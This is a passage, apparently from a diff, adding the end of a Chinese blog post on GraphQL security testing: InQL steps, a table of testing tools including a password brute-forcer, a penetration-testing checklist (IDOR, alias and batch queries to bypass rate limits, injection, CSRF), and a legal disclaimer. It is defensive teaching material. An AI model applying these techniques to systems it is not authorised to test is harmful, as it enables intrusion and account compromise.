+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. Burp Suite -&gt; Extender -&gt; Add -&gt; 加载 InQL Scanner</span></span><br><span class="line"><span class="comment"># 2. 在目标站点浏览或发送请求到 /graphql 端点</span></span><br><span class="line"><span class="comment"># 3. InQL 自动检测并提取 Schema</span></span><br><span class="line"><span class="comment"># 4. 右键 -&gt; InQL -&gt; Generate Queries</span></span><br><span class="line"><span class="comment"># 5. 使用生成的查询模板进行安全测试</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他辅助工具"><a href="#其他辅助工具" class="headerlink" title="其他辅助工具"></a>其他辅助工具</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Clairvoyance</strong></td>
+<td>在内省关闭时通过字段建议功能恢复 Schema</td>
+</tr>
+<tr>
+<td><strong>GraphQL Cop</strong></td>
+<td>自动化 GraphQL 安全审计脚本</td>
+</tr>
+<tr>
+<td><strong>GraphQL Raider</strong></td>
+<td>浏览器开发者工具中的 GraphQL 测试面板</td>
+</tr>
+<tr>
+<td><strong>BatchQL</strong></td>
+<td>轻量级 GraphQL 安全审计工具，支持检测 DoS 和 IDOR</td>
+</tr>
+<tr>
+<td><strong>CrackQL</strong></td>
+<td>自动化 GraphQL 密码暴力破解工具</td>
+</tr>
+</tbody></table>
+<h2 id="八、综合测试-Checklist"><a href="#八、综合测试-Checklist" class="headerlink" title="八、综合测试 Checklist"></a>八、综合测试 Checklist</h2><p>在对 GraphQL 端点进行安全测试时，建议按以下清单逐项排查：</p>
+<ul>
+<li><input disabled="" type="checkbox"> <strong>端点发现：</strong> 确认 <code>/graphql</code>、<code>/gql</code>、<code>/api/graphql</code>、<code>/v1/graphql</code> 等常见路径。</li>
+<li><input disabled="" type="checkbox"> <strong>内省探测：</strong> 尝试 <code>__schema</code>、<code>__type</code> 查询，确认内省是否开启。</li>
+<li><input disabled="" type="checkbox"> <strong>Schema 导出：</strong> 导出完整 Schema，识别敏感类型、字段和 Mutation。</li>
+<li><input disabled="" type="checkbox"> <strong>字段建议：</strong> 发送错误字段名，观察是否有”Did you mean”类型的泄露。</li>
+<li><input disabled="" type="checkbox"> <strong>IDOR 测试：</strong> 遍历 ID 参数，测试水平越权；尝试嵌套查询绕过权限校验。</li>
+<li><input disabled="" type="checkbox"> <strong>别名轰炸：</strong> 在同一次查询中构造大量别名，测试速率限制是否有效。</li>
+<li><input disabled="" type="checkbox"> <strong>Query Batching：</strong> 尝试发送数组格式的批量查询，绕过速率限制。</li>
+<li><input disabled="" type="checkbox"> <strong>深度递归：</strong> 构造循环嵌套查询，测试最大深度限制和超时保护。</li>
+<li><input disabled="" type="checkbox"> <strong>注入测试：</strong> 向字符串参数注入 SQL&#x2F;NoSQL&#x2F;OS 命令 Payload，观察响应。</li>
+<li><input disabled="" type="checkbox"> <strong>CSRF 测试：</strong> 测试端点是否接受 GET、form-urlencoded 或 multipart 请求格式。</li>
+<li><input disabled="" type="checkbox"> <strong>CORS 检查：</strong> 使用恶意 Origin 头跨域请求，确认 CORS 配置安全。</li>
+<li><input disabled="" type="checkbox"> <strong>Subscription 鉴权：</strong> 尝试未认证连接 WebSocket，测试订阅的消息是否会泄露。</li>
+<li><input disabled="" type="checkbox"> <strong>文件上传：</strong> 若存在文件上传 Mutation，测试类型限制、大小限制和任意文件覆盖。</li>
+<li><input disabled="" type="checkbox"> <strong>错误信息泄露：</strong> 触发错误后检查响应中是否包含堆栈跟踪（Stack Trace）、数据库查询细节或调试信息。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>GraphQL 的安全性高度依赖于服务端在每个 Resolver 层的实现细节。传统面向 REST 的安全策略（如基于 URL 的速率限制、全局中间件鉴权）在 GraphQL 场景下往往存在盲区。安全测试者需要深入理解图查询的工作方式，结合专用的测试工具，才能系统性地覆盖 GraphQL 特有的攻击面。</p>
+<p>对于开发与运维团队，建议将”安全左移”——在 GraphQL Schema 设计阶段就引入权限模型和查询成本约束，而非在生产环境暴露后才进行补救。</p>
+<hr>
+<blockquote>
+<p><strong>免责声明：</strong> 本文所述技术仅供安全研究与授权测试使用。未经授权对目标系统进行安全测试和攻击属于违法行为。读者在实际操作中应遵守《中华人民共和国网络安全法》《中华人民共和国数据安全法》等相关法律法规，在获得明确书面授权的前提下开展工作。作者不对因滥用文中技术导致的任何法律责任或损失承担责任。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/" rel="tag"># 移动安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/OAuth-attacks/" rel="prev" title="OAuth 2.0攻击面">
+                  <i class="fa fa-angle-left"></i> OAuth 2.0攻击面
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Session-attacks/" rel="next" title="Session安全攻防 — 从会话固定到反序列化的攻击链与防御">
+                  Session安全攻防 — 从会话固定到反序列化的攻击链与防御 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
